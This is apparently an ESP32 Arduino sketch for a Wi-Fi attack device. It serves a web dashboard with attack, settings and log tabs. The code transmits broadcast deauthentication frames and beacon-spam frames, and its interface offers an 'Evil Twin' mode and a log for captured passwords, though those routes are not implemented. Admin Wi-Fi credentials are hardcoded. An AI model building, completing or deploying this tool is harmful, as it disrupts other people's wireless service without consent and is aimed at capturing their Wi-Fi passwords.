#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <esp_wifi.h>

// --- KONFIGURASI ---
String admin_ssid = "GMpro";
String admin_pass = "Sangkur87";
String target_ssid = "Target_WiFi";
uint8_t target_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
int target_ch = 1;

// Status Mode
bool deauth_active = false;
bool beacon_active = false;
bool etwin_active = false;

AsyncWebServer server(80);
DNSServer dnsServer;

// --- UI DASHBOARD (FULL TABS) ---
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body { background:#000; color:#0f0; font-family:monospace; margin:0; text-align:center; }
  .header { font-size:24px; padding:15px; border-bottom:2px solid #0f0; }
  .tab { display:flex; background:#111; border-bottom:1px solid #0f0; }
  .tab button { flex:1; padding:12px; background:none; color:#0f0; border:none; cursor:pointer; }
  .tab button.active { background:#0f0; color:#000; font-weight:bold; }
  .content { display:none; padding:20px; }
  .show { display:block; }
  .btn { width:100%; padding:15px; margin:5px 0; background:#000; color:#0f0; border:1px solid #0f0; cursor:pointer; }
  #list { height:120px; overflow-y:scroll; background:#050505; border:1px solid #333; text-align:left; padding:5px; font-size:11px; }
  input { width:100%; padding:10px; margin:10px 0; background:#111; border:1px solid #444; color:#fff; box-sizing:border-box; }
</style>
</head><body>
  <div class="header">GMpro87</div>
  <div class="tab">
    <button class="t-btn active" onclick="openT(event,'atk')">ATTACK</button>
    <button class="t-btn" onclick="openT(event,'set')">SETTING</button>
    <button class="t-btn" onclick="openT(event,'log')">LOGS</button>
  </div>
  
  <div id="atk" class="content show">
    <div id="list">Scan WiFi untuk memilih target...</div>
    <button class="btn" onclick="scan()">SCAN WIFI</button>
    <button class="btn" onclick="api('/deauth')">DEAUTH</button>
    <button class="btn" onclick="api('/beacon')">BEACON SPAM</button>
    <button class="btn" onclick="api('/etwin')">EVIL TWIN (ACTIVE)</button>
  </div>

  <div id="set" class="content">
    <input type="text" id="ss" placeholder="Admin SSID" value="GMpro">
    <input type="password" id="ps" placeholder="Admin Pass" value="Sangkur87">
    <button class="btn">SAVE & REBOOT</button>
  </div>

  <div id="log" class="content">
    <div id="logs" style="text-align:left; color:red;">No Passwords Captured.</div>
    <button class="btn" onclick="api('/clear')">CLEAR LOG</button>
  </div>

<script>
function openT(e,n){
  var i,c,b;
  c=document.getElementsByClassName("content"); for(i=0;i<c.length;i++)c[i].classList.remove("show");
  b=document.getElementsByClassName("t-btn"); for(i=0;i<b.length;i++)b[i].classList.remove("active");
  document.getElementById(n).classList.add("show"); e.currentTarget.classList.add("active");
}
function scan(){
  document.getElementById('list').innerHTML = "Scanning...";
  fetch('/do-scan').then(r=>r.json()).then(d=>{
    let h=""; d.forEach(x=>{ h+=`<div onclick="alert('Target Lock: '+x.s)">${x.s} (Ch:${x.c})</div>`; });
    document.getElementById('list').innerHTML=h;
  });
}
function api(p){ fetch(p).then(r=>r.text()).then(t=>alert(t)); }
</script>
</body></html>)rawliteral";

// --- PAYLOAD GENERATOR ---
void sendDeauth() {
  uint8_t packet[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00};
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
}

void sendBeacon() {
  uint8_t beaconPacket[128] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x00 };
  // Logika penambahan SSID kustom di paket beacon bisa sangat panjang, ini base-nya.
  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, 128, false);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_max_tx_power(78);
  
  WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str());
  dnsServer.start(53, "*", WiFi.softAPIP());

  // Routes
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", index_html);
  });

  server.on("/do-scan", HTTP_GET, [](AsyncWebServerRequest *request){
    int n = WiFi.scanNetworks();
    String j = "[";
    for(int i=0; i<n; i++){
      j += "{\"s\":\""+WiFi.SSID(i)+"\",\"c\":"+String(WiFi.channel(i))+"}";
      if(i<n-1) j += ",";
    }
    j += "]";
    request->send(200, "application/json", j);
  });

  server.on("/deauth", [](AsyncWebServerRequest *request){
    deauth_active = !deauth_active;
    request->send(200, "text/plain", deauth_active ? "ON" : "OFF");
  });

  server.on("/beacon", [](AsyncWebServerRequest *request){
    beacon_active = !beacon_active;
    request->send(200, "text/plain", beacon_active ? "Beacon Spam ON" : "OFF");
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  if(deauth_active) { sendDeauth(); delay(2); }
  if(beacon_active) { sendBeacon(); delay(10); }
}
